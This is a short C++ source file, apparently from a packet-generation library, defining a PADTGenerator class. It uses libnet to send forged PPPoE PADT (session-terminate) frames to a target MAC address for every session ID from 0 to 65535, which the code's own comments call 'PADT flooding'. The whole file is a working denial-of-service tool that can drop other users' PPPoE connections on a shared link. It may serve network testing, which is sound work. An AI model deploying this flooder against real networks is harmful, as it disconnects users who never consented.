#include <libnet.h>
#include "PADTGenerator.h"
#include "Log.h"

using namespace std;
using namespace hippolib;

PADTGenerator::PADTGenerator(const std::string & name, const unsigned char *src, const unsigned char *dst,
						unsigned int interval) : GPacketGenerator(name), m_interval(interval)
{
	memcpy(m_srcmac, src, 6);
	memcpy(m_dstmac, dst, 6);
}

void PADTGenerator::run()
{
	unsigned short session, tmp;
	unsigned char payload[6];
	libnet_ptag_t ethernet = 0;
	int ret;

	if(m_libc == NULL)
	{
		//LOG4CXX_ERROR(m_logger, "libc is NULL");
		return;
	}

	//LOG4CXX_DEBUG(m_logger, "PADT flooding starts");

	payload[0] = 0x11;
	payload[1] = 0xa7;
	payload[4] = 0x0;
	payload[5] = 0x0;
	session = 0;
	for(int i = 0; i <= 65535; i++)
	{
		if(IsStopping())
			break;
		
		tmp = htons(session++);
		memcpy(&payload[2], &tmp, 2);

		libnet_clear_packet((libnet_t*)m_libc);
		ethernet = libnet_build_ethernet(
						m_dstmac,
						m_srcmac,
						0x8863,
						(u_int8_t*)payload,
						(u_int32_t)6,
						(libnet_t*)m_libc,
						0);
		if(ethernet == -1)
		{
			//LOG4CXX_ERROR(m_logger, "cannot build ethernet layer");
			continue;
		}

		ret = libnet_write((libnet_t*)m_libc);
		if(ret == -1)
		{
			//LOG4CXX_ERROR(m_logger, "cannot write packet");
			continue;
		}

		if(m_interval != 0)
			thread::sleep(m_interval);
	}

	//LOG4CXX_DEBUG(m_logger, "PADT flooding ends");
}

